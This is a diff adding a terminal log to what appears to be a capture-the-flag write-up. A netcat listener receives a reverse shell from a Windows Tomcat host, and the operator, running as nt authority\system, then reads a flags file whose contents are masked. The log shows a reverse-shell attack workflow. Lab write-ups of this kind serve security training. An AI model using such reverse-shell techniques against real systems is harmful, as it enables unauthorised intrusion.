@@ -26,4 +26,89 @@ allenwest1@debian:~$ ip a
 .
 .
 .
+allenwest1@debian:~$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.95] 49192
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\apache-tomcat-7.0.88>whoami
+whoami
+nt authority\system
+
+C:\apache-tomcat-7.0.88>cd C:/Users/Administrator/Desktop
+cd C:/Users/Administrator/Desktop
+
+C:\Users\Administrator\Desktop>ls
+ls
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FC2B-E489
+
+ Directory of C:\Users\Administrator\Desktop
+
+06/19/2018  07:09 AM    <DIR>          .
+06/19/2018  07:09 AM    <DIR>          ..
+06/19/2018  07:09 AM    <DIR>          flags
+               0 File(s)              0 bytes
+               3 Dir(s)  27,603,046,400 bytes free
+
+C:\Users\Administrator\Desktop>cir flags
+cir flags
+
+C:\Users\Administrator\Desktop>dir flags
+dir flags
+ Volume in drive C has no label.
+ Volume Serial Number is FC2B-E489
+
+ Directory of C:\Users\Administrator\Desktop\flags
+
+06/19/2018  07:09 AM    <DIR>          .
+06/19/2018  07:09 AM    <DIR>          ..
+06/19/2018  07:11 AM                88 2 for the price of 1.txt
+               1 File(s)             88 bytes
+               2 Dir(s)  27,603,046,400 bytes free
+
+C:\Users\Administrator\Desktop>type "2 for the price of 1.txt"
+type "2 for the price of 1.txt"
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FC2B-E489
+
+ Directory of C:\Users\Administrator\Desktop
+
+06/19/2018  07:09 AM    <DIR>          .
+06/19/2018  07:09 AM    <DIR>          ..
+06/19/2018  07:09 AM    <DIR>          flags
+               0 File(s)              0 bytes
+               3 Dir(s)  27,603,046,400 bytes free
+
+C:\Users\Administrator\Desktop>cd flags
+cd flags
+
+C:\Users\Administrator\Desktop\flags>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FC2B-E489
+
+ Directory of C:\Users\Administrator\Desktop\flags
+
+06/19/2018  07:09 AM    <DIR>          .
+06/19/2018  07:09 AM    <DIR>          ..
+06/19/2018  07:11 AM                88 2 for the price of 1.txt
+               1 File(s)             88 bytes
+               2 Dir(s)  27,603,046,400 bytes free
+
+C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
+type "2 for the price of 1.txt"
+user.txt
+********************************
+
+root.txt
+********************************
+C:\Users\Administrator\Desktop\flags>
 
